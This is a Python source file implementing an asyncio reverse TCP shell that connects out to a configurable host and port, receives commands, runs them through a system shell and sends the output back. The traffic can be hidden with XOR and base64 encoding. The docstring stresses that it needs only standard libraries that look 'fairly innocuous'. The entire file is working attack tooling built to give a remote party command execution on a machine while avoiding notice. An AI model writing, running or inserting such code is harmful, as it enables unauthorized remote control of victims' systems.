# !/usr/bin/env python3
import asyncio
from utils.xor_encoder import Xor

class AsyncioReverseShell:
    """
    A reverse tcp shell that only requires importing the `asyncio` library. Xor
    encryption, if enabled, is wrapped in base64 encoding, so if enabled requires
    the `base64` library. Both of these are libraries come standard with the python
    interpreter and are fairly innocuous.
    """

    def __init__(self, host: str, port: int, key: str = None, verbose: bool = False):
        self.host = host
        self.port = port
        self.reader: asyncio.streams.StreamReader | None = None
        self.writer: asyncio.streams.StreamWriter | None = None
        self.xor = Xor(key)
        self.verbose = verbose

    async def open_connection(self):
        self.reader, self.writer = await asyncio.open_connection(self.host, self.port)

    def printer(self, text: str):
        if self.verbose:
            print(f'{text}')

    async def close(self):
        if self.verbose:
            print('[+] Close the connection')
        self.writer.close()
        await self.writer.wait_closed()

    async def exec_cmd(self, cmd: str):
        if cmd.strip('\r\n').upper() == "__QUIT__":
            self.printer('[quit] received quit')
            self.writer.write(self.xor.encoder('__EOF__\n'))
            await self.close()
            exit()

        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT
        )

        stdout, stderr = await proc.communicate()
        if self.verbose:
            print(f'[{cmd!r} exited with {proc.returncode}]')
        return stdout.decode()

    async def shell(self):
        await self.open_connection()
        self.writer.write(self.xor.encoder('HELLO\n'))
        while 1:
            cmd = await self.reader.read(1024)
            cmd = self.xor.decoder(cmd)
            self.printer(f'[recv] {cmd}')
            ret = await self.exec_cmd(cmd)
            ret = self.xor.encoder(ret)
            self.printer(f'[send] {ret}')
            self.writer.write(ret)

if __name__ == '__main__':
    # Change the key to some string value to enable xor encryption.
    shell = AsyncioReverseShell('127.0.0.1', 1337, None)
    asyncio.run(shell.shell())